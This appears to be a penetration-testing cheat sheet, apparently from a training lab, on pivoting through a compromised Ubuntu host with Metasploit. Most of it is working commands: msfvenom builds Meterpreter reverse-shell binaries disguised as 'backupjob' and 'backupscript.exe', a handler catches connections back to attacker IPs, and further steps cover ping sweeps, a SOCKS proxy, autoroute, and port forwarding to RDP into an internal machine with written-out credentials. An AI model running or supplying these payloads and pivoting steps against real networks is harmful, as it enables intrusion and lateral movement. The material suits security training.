
#### Creating Payload for Ubuntu Pivot Host

```shell-session

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### Configuring & Starting the multi/handler

```shell-session
use exploit/multi/handler
```

```shell-session
set lhost 0.0.0.0
```

```shell-session
set lport 8080
```
```shell-session
set payload linux/x64/meterpreter/reverse_tcp
```

```shell-session
run
```

We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.

#### Executing the Payload on the Pivot Host

```shell-session
./backupjob
```


#### Ping Sweep

```shell-session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```


#### Ping Sweep For Loop on Linux Pivot Hosts

```shell-session

for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD

```cmd-session

for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell

```powershell-session

1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`

#### Configuring MSF's SOCKS Proxy

```shell-session
use auxiliary/server/socks_proxy
```

```shell-session
set SRVPORT 9050
```

```shell-session
set SRVHOST 0.0.0.0
```

```shell-session
set version 4a
```

```shell-session
run
```

```shell-session
options
```

#### Confirming Proxy Server is Running

```shell-session
jobs
```

```shell-session
Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

#### Adding a Line to proxychains.conf if Needed

```shell-session
socks4 	127.0.0.1 9050
```


Tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

#### Creating Routes with AutoRoute

```shell-session
use post/multi/manage/autoroute
```

```shell-session
set SESSION 1
```

```shell-session
set SUBNET 172.16.5.0
```

```shell-session
run
```
or
```shell-session
run autoroute -s 172.16.5.0/23
```

 `-p` option to list the active routes
#### Listing Active Routes with AutoRoute

```shell-session
run autoroute -p
```

#### Testing Proxy & Routing Functionality

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding

#### Portfwd options

```shell-session
help portfwd
```

#### Creating Local TCP Relay

```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

#### Connecting to Windows Target through localhost

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Netstat Output

```shell-session
netstat -antp
```

## Meterpreter Reverse Port Forwarding

#### Reverse Port Forwarding Rules

```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

#### Configuring & Starting multi/handler

```shell-session
bg
```

```shell-session
set payload windows/x64/meterpreter/reverse_tcp
```

```shell-session
set LPORT 8081 
```

```shell-session
set LHOST 0.0.0.0 
```

```shell-session
run
```

#### Generating the Windows Payload

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

#### Establishing the Meterpreter session

```shell-session
shell
```





